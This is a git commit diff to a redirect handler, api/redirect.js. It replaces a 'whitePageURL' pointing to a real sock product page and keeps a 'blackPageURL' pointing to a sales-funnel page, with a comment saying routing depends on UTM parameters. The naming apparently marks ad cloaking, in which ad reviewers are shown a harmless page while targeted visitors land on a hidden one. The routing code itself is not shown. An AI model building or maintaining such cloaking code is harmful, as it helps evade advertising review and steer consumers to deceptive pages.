b3b4dc9f04fcf4458f5a7afdb309b186de9394e0
s4-glitchy <s4alicreator001@gmail.com>
2025-01-04 03:07:03 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.cuffed.com.au/collections/socks/products/single-letter-socks";
+    const whitePageURL = "https://www.asics.com/au/en-au/pace-low-sock-3-pack/p/AOP_3033A615-101.html";
     const blackPageURL = "https://qkoyuipdyy.myfunnelish.com/imbassd-1735569750458492";
   
     // Parse the UTM parameters from the request URL
